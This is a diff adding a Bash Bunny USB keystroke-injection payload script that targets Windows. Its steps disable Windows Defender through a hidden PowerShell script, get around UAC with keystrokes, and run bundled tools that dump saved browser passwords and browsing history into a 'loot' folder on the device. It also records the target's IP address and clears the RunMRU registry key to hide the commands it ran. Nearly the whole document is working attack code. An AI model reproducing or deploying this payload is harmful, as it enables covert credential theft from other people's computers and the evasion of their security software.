@@ -1,0 +1,131 @@
+#!/bin/bash
+#
+# Windows browser info grabbing 
+#
+
+# Delay Configuration
+#------------------------------------------------------------------
+#standard=100 SLOWMODE=500
+SFD="500"
+#standard=500 SLOWMODE=1000
+FD="1000"
+#standard=1000 SLOWMODE=2000
+ND="2000"
+#standard=1500 SLOWMODE=3500
+LD="3500"
+
+#Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+GET TARGET_IP
+
+#Wait for the computer to recognize the drive etc
+Q delay $LD
+Q delay $LD
+Q delay $LD
+#Disable Windows Defender
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\disable-anti-virus.ps1')"
+#Bypass UAC
+Q DELAY $ND
+Q LEFT
+Q ENTER
+#Get drive letter and copy it:
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetDrive.ps1')"
+Q DELAY $ND
+
+#BPG (BrowserPasswordGrabber)
+LED STAGE2
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\pass.exe')"
+Q DELAY $LD
+Q CONTROL a
+Q DELAY $FD
+Q CONTROL s
+Q DELAY $FD
+Q STRING %computername% - Pass
+Q F4
+Q DELAY $SFD
+Q CONTROL a
+Q DELAY $SFD
+Q CONTROL v
+Q DELAY $SFD
+Q STRING 'loot\WinCreds'
+Q DELAY $SFD
+Q ENTER
+Q DELAY $FD
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY $SFD
+Q ALT F4
+
+#BHG (BrowserHistoryGrabber)
+LED STAGE 3
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\history.exe')"
+Q DELAY $LD
+Q ENTER
+Q DELAY $LD
+Q DELAY $LD
+Q CONTROL a
+Q DELAY $FD
+Q CONTROL s
+Q DELAY $FD
+Q STRING %computername% - History
+Q F4
+Q DELAY $SFD
+Q CONTROL a
+Q DELAY $SFD
+Q CONTROL v
+Q DELAY $SFD
+Q STRING 'loot\WinCreds'
+Q DELAY $SFD
+Q ENTER
+Q DELAY $FD
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY $SFD
+Q ALT F4
+
+# Get Target IP
+Q STRING cd
+Q SPACE
+Q CONTROL v
+Q BACKSPACE
+Q STRING '\loot'
+Q ENTER
+Q DELAY $SFD
+Q STRING '$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address >>'
+Q SPACE
+Q CNTRL v
+Q DELAY $SFD
+Q BACKSPACE
+Q STRING '\loot\WinCreds\ip.txt'
+Q ENTER
+Q DELAY $SFD
+Q STRING exit
+Q ENTER
+Q DELAY $SFD
+
+#Let code run, then sync
+#Q DELAY 5000
+sync
+
+# Wait for misc. to happen on computer
+Q DELAY $ND
+
+################################################# Cleaning up phase
+LED CLEANUP
+RUN WIN powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+Q ENTER
+
+LED FINISH
+ATTACKMODE OFF
